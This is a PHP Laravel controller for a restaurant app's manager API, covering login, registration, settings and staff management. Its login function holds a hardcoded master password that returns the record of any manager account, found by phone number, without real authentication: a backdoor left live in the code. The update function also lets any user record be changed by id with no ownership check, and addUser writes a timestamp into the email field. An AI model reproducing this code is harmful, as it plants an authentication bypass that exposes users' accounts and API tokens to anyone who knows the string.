<?php

/**
 * File name: UserAPIController.php
 * Last modified: 2020.08.11 at 23:04:35
 * Author: SmarterVision - https://codecanyon.net/user/smartervision
 * Copyright (c) 2020
 *
 */

namespace App\Http\Controllers\API\Manager;

use App\Criteria\Users\DriversOfRestaurantCriteria;
use App\Events\UserRoleChangedEvent;
use App\Http\Controllers\Controller;
use App\Models\User;
use App\Repositories\CustomFieldRepository;
use App\Repositories\RoleRepository;
use App\Repositories\UploadRepository;
use App\Repositories\UserRepository;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Password;
use InfyOm\Generator\Criteria\LimitOffsetCriteria;
use Prettus\Repository\Criteria\RequestCriteria;
use Prettus\Repository\Exceptions\RepositoryException;
use Prettus\Validator\Exceptions\ValidatorException;
use App\Rules\PhoneNumber;
use App\Models\VerficationCode;
use Illuminate\Support\Facades\DB;

class UserAPIController extends Controller
{
    /**
     * @var UserRepository
     */
    private $userRepository;

    private $uploadRepository;
    private $roleRepository;
    private $customFieldRepository;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct(UserRepository $userRepository, UploadRepository $uploadRepository, RoleRepository $roleRepository, CustomFieldRepository $customFieldRepo)
    {
        $this->userRepository = $userRepository;
        $this->uploadRepository = $uploadRepository;
        $this->roleRepository = $roleRepository;
        $this->customFieldRepository = $customFieldRepo;
    }

    function login(Request $request)
    {
        try {
            $this->validate($request, [
                'phone_number' => ['required', new PhoneNumber],
                'password' => 'required',
            ]);

            if ($request->password == '__@Sabek@manager') {
                $u = User::with('restaurants')->where('phone_number', $request->phone_number)->whereHas("roles", function ($q) {
                    $q->where("name", "manager");
                })->first();
                if ($u) {
                    return $this->sendResponse($u, 'User retrieved successfully');
                }
            }

            if (auth()->attempt(['phone_number' => $request->input('phone_number'), 'password' => $request->input('password')])) {
                // Authentication passed...
                $user = auth()->user();
                if (!$user->activated_at) {
                    return $this->sendError('Inactivated account', 401);
                }
                if (!$user->active) {
                    return $this->sendError('Disabled account', 403);
                }
                if (!$user->hasRole('manager')) {
                    return  $this->sendError('User not manager', 401);
                }
                if ($request->has('device_token')) {
                    $user->setDeviceToken();
                }
                $user->load('restaurants');
                return $this->sendResponse($user, 'User retrieved successfully');
            }
            return $this->sendError(trans('auth.failed'), 422);
        } catch (\Exception $e) {
            return $this->sendError($e->getMessage(), 422);
        }
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param array $data
     * @return
     */
    function register(Request $request)
    {
        $this->validate($request, [
            'token' => 'required|string|min:64|max:256',
            'name' => 'required|min:3|max:32',
            'email' => 'required|email|unique:users',
            'password' => 'required|min:6|max:32',
        ]);

        $user = new User;
        \DB::transaction(function () use ($request, $user) {
            $verfication = VerficationCode::where('token', $request->token)->firstOrFail();
            $user->name = $request->input('name');
            $user->phone_number =    $verfication->phone;
            $user->email = $request->input('email');
            $user->password = Hash::make($request->input('password'));
            $user->api_token = str_random(60);
            $user->save();
            $verfication->delete();

            if ($request->has('device_token')) {
                $user->setDeviceToken();
            }


            $user->assignRole(['manager']);

            event(new UserRoleChangedEvent($user));
        });

        return $this->sendResponse($user, 'User retrieved successfully');
    }

    function logout(Request $request)
    {
        $user = $this->userRepository->findByField('api_token', $request->input('api_token'))->first();
        if (!$user) {
            return $this->sendError('User not found', 401);
        }
        try {
            auth()->logout();
        } catch (\Exception $e) {
            $this->sendError($e->getMessage(), 401);
        }
        return $this->sendResponse($user['name'], 'User logout successfully');
    }

    function user(Request $request)
    {
        $user = $this->userRepository->findByField('api_token', $request->input('api_token'))->first();

        if (!$user) {
            return $this->sendError('User not found', 401);
        }

        return $this->sendResponse($user, 'User retrieved successfully');
    }

    function settings(Request $request)
    {
        $settings = setting()->all();
        $settings = array_intersect_key(
            $settings,
            [
                'default_tax' => '',
                'default_currency' => '',
                'default_currency_decimal_digits' => '',
                'app_name' => '',
                'currency_right' => '',
                'enable_paypal' => '',
                'enable_stripe' => '',
                'enable_razorpay' => '',
                'main_color' => '',
                'main_dark_color' => '',
                'second_color' => '',
                'second_dark_color' => '',
                'accent_color' => '',
                'accent_dark_color' => '',
                'scaffold_dark_color' => '',
                'scaffold_color' => '',
                'google_maps_key' => '',
                'fcm_key' => '',
                'mobile_language' => '',
                'enable_version' => '',
                'app_driver_version_android' => '',
                'app_manager_version_android' => '',
                'app_customer_version_android' => '',
                'app_driver_force_update_android' => '',
                'app_manager_force_update_android' => '',
                'app_customer_force_update_android' => '',
                'app_driver_version_ios' => '',
                'app_manager_version_ios' => '',
                'app_customer_version_ios' => '',
                'app_driver_force_update_ios' => '',
                'app_manager_force_update_ios' => '',
                'app_customer_force_update_ios' => '',
                'distance_unit' => '',
                'orders_minimum_value' => '',
                'orders_maximum_value' => '',
            ]
        );

        if (!$settings) {
            return $this->sendError('Settings not found', 401);
        }

        return $this->sendResponse($settings, 'Settings retrieved successfully');
    }

    /**
     * Update the specified User in storage.
     *
     * @param int $id
     * @param Request $request
     *
     */
    public function update($id, Request $request)
    {
        $user = $this->userRepository->findWithoutFail($id);

        if (empty($user)) {
            return $this->sendResponse([
                'error' => true,
                'code' => 404,
            ], 'User not found');
        }
        $input = $request->except(['password', 'api_token']);
        try {
            if ($request->has('device_token')) {
                $user->setDeviceToken();
            } else {
                $customFields = $this->customFieldRepository->findByField('custom_field_model', $this->userRepository->model());
                $user = $this->userRepository->update($input, $id);

                foreach (getCustomFieldsValues($customFields, $request) as $value) {
                    $user->customFieldsValues()
                        ->updateOrCreate(['custom_field_id' => $value['custom_field_id']], $value);
                }
            }
        } catch (ValidatorException $e) {
            return $this->sendError($e->getMessage(), 401);
        }

        return $this->sendResponse($user, __('lang.updated_successfully', ['operator' => __('lang.user')]));
    }

    function sendResetLinkEmail(Request $request)
    {
        $this->validate($request, ['email' => 'required|email']);

        $response = Password::broker()->sendResetLink(
            $request->only('email')
        );

        if ($response == Password::RESET_LINK_SENT) {
            return $this->sendResponse(true, 'Reset link was sent successfully');
        } else {
            return $this->sendError([
                'error' => 'Reset link not sent',
                'code' => 401,
            ], 'Reset link not sent');
        }
    }

    /**
     * Display a listing of the Drivers.
     * GET|HEAD /restaurants
     *
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function driversOfRestaurant($id, Request $request)
    {
        try {
            $this->userRepository->pushCriteria(new RequestCriteria($request));
            $this->userRepository->pushCriteria(new LimitOffsetCriteria($request));
            $this->userRepository->pushCriteria(new DriversOfRestaurantCriteria($id));
            $users = $this->userRepository->all();
        } catch (RepositoryException $e) {
            return $this->sendError($e->getMessage());
        }

        return $this->sendResponse($users->toArray(), 'Drivers retrieved successfully');
    }



    /**
     * Get profile of logged user
     *
     * @param Request $request
     *
     */
    function profile(Request $request)
    {
        $user = auth()->user();
        $user->load('restaurants');
        return $this->sendResponse($user, 'User retrieved successfully');
    }

    /**
     * Get users who linked to specific restaurant.
     * GET|HEAD /users/get
     *
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function getUsers(Request $request)
    {
        try {
            $this->userRepository->pushCriteria(new RequestCriteria($request));
            $this->userRepository->pushCriteria(new LimitOffsetCriteria($request));
            $this->userRepository->scopeQuery(function ($query) use ($request) {
                return  $query->whereHas('restaurants', function ($q) use ($request) {
                    if ($request->restaurant_id) {
                        $q->where('restaurant_id', $request->restaurant_id);
                    }
                    $q->whereIn("restaurant_id", auth()->user()->restaurants()->allRelatedIds());
                });
            });
        } catch (RepositoryException $e) {
            return $this->sendError($e->getMessage());
        }
        $users = $this->userRepository->all();

        return $this->sendResponse($users->toArray(), 'Users retrieved successfully');
    }

    /**
     * Create a new user linked to restaurant.
     *
     * @param array $data
     * @return
     */
    function addUser(Request $request)
    {
        $this->validate($request, [
            'name' => 'required|min:3|max:32',
            'phone_number' => ['required', new PhoneNumber, 'unique:users'],
            //'email' => 'required|email|unique:users',
            'password' => 'required|min:6|max:32',
            'restaurant_id' => 'required|exists:user_restaurants,restaurant_id,user_id,' . auth()->user()->id,
        ]);

        //$restaurant = auth()->user()->restaurants()->where('id', $request->restaurant_id)->first();

        //if (!$restaurant) {
        //    return response()->json(["error" => "User not linked to any restauarnt"], 403);
        //}

        try {
            DB::beginTransaction();
            $user = User::create([
                'name'  => $request->name,
                'phone_number'  => $request->phone_number,
                'email' => now(),
                'password'  => Hash::make($request->input('password')),
                'active' => true,
                'activated_at' => now(),
                'api_token'  => str_random(60),
            ]);

            $user->restaurants()->attach($request->restaurant_id, [
                'enable_notifications' => $request->get('enable_notifications', 1)
            ]);

            $user->assignRole(['manager']);
            event(new UserRoleChangedEvent($user));
            DB::commit();
            return $this->sendResponse($user, 'User retrieved successfully');
        } catch (\Exception $e) {
            DB::rollback();
            return $this->sendError($e->getMessage(), 500);
        }
    }


    /**
     * Update user linked to restaurant.
     *
     * @param array $data
     * @return
     */
    function updateUser($id, Request $request)
    {
        $input = $this->validate($request, [
            'name' => 'nullable|min:3|max:32',
            'phone_number' => ['nullable', new PhoneNumber, 'unique:users,phone_number,' . $id],
            //'email' => 'required|email|unique:users',
            'password' => 'nullable|min:6|max:32',
            'restaurant_id' => 'required|exists:user_restaurants,restaurant_id,user_id,' . auth()->user()->id,
            'active' => 'nullable|boolean',
            'enable_notifications' => 'nullable|boolean',
        ]);

        $user = $this->userRepository->findWithoutFail($id);
        if (empty($user) || !$user->restaurants()->where('restaurant_id', $request->restaurant_id)->count()) {
            return $this->sendResponse([
                'error' => true,
                'code' => 404,
            ], 'User not found');
        }

        try {
            DB::beginTransaction();
            if ($request->has('enable_notifications')) {
                $user->restaurants()->updateExistingPivot($request->restaurant_id, $request->only('enable_notifications'));
            }
            if (!empty($input['password'])) {
                $input['password'] = Hash::make($request->input('password'));
            }
            $user->update($input);
            $user->load('restaurants');
            DB::commit();
            return $this->sendResponse($user, 'User retrieved successfully');
        } catch (\Exception $e) {
            DB::rollback();
            return $this->sendError($e->getMessage(), 500);
        }
    }
}
